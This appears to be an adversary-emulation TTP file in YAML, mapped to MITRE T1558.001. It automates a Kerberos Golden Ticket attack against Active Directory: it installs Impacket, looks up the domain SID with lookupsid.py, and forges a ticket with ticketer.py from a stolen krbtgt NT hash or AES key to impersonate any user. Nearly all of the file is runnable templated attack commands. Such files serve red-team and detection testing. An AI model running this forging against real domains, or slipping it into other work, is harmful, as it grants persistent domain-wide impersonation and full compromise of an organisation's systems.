---
api_version: 2.0
uuid: c9d4e1f6-8a5b-4c7d-b3e2-1f0a9c8d7b6e
name: Golden Ticket Attack
authors:
  - isaac_fletcher
description: |
  Forges a Golden Ticket using Impacket's ticketer.py by leveraging a compromised krbtgt account hash.
  Looks up the domain SID via lookupsid.py, then forges the ticket using the selected key type (RC4 or AES).
requirements:
  platforms:
    - os: linux
    - os: darwin
mitre:
  tactics:
    - TA0006 Credential Access
  techniques:
    - T1558 Steal or Forge Kerberos Tickets
  subtechniques:
    - T1558.001 Golden Ticket
args:
  - name: domain
    description: The target Active Directory domain (e.g., contoso.com)
    default: contoso.local
  - name: dc
    description: The Domain Controller IP or hostname to target
    default: dc01.contoso.local
  - name: username
    description: Username for authentication to the domain controller (without domain prefix)
  - name: password
    description: Password for authentication
  - name: ticket_type
    description: |
      The type of krbtgt key to use for the golden ticket.
      - rc4: Use an NT hash
      - aes: Use an AES 128 or 256 bit key
    choices:
      - rc4
      - aes
    default: rc4
  - name: krbtgt_key
    description: The krbtgt key to use (NT hash for RC4 or AES 128/256 bit key for AES)
  - name: ticket_user
    description: The username to impersonate in the golden ticket
  - name: output_file
    description: Path to save the forged ticket file
    default: /tmp/golden_ticket.ccache
steps:
  - name: setup_impacket
    description: Install impacket
    ttp: //utils/pip-install/ttp.yaml
    args:
      modules: "impacket"

  - name: lookup_sid
    description: Look up the domain SID using lookupsid.py
    inline: |
      lookupsid.py '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}@{{.Args.dc}}' 0
    outputvar: LOOKUPSID_OUTPUT

  - name: extract_domain_sid
    description: Extract the domain SID from the lookupsid output
    inline: |
      echo '{[{.StepVars.LOOKUPSID_OUTPUT}]}' | grep -oP 'Domain SID is: \K\S+'
    outputvar: DOMAIN_SID

  - name: forge_golden_ticket
    description: Create a golden ticket for the target user
    inline: |
      {{if eq .Args.ticket_type "rc4"}}
      echo "[*] Forging golden ticket using RC4 key (NT hash)"
      ticketer.py -nthash "{{.Args.krbtgt_key}}" -domain-sid "{[{.StepVars.DOMAIN_SID}]}" -domain "{{.Args.domain}}" "{{.Args.ticket_user}}"
      {{else}}
      echo "[*] Forging golden ticket using AES key"
      ticketer.py -aesKey "{{.Args.krbtgt_key}}" -domain-sid "{[{.StepVars.DOMAIN_SID}]}" -domain "{{.Args.domain}}" "{{.Args.ticket_user}}"
      {{end}}
      mv "{{.Args.ticket_user}}.ccache" "{{.Args.output_file}}"
    cleanup:
      inline: |
        echo "Cleaning up Golden Ticket. krbtgt password must be changed twice to invalidate the ticket."
        rm -f "{{.Args.output_file}}"
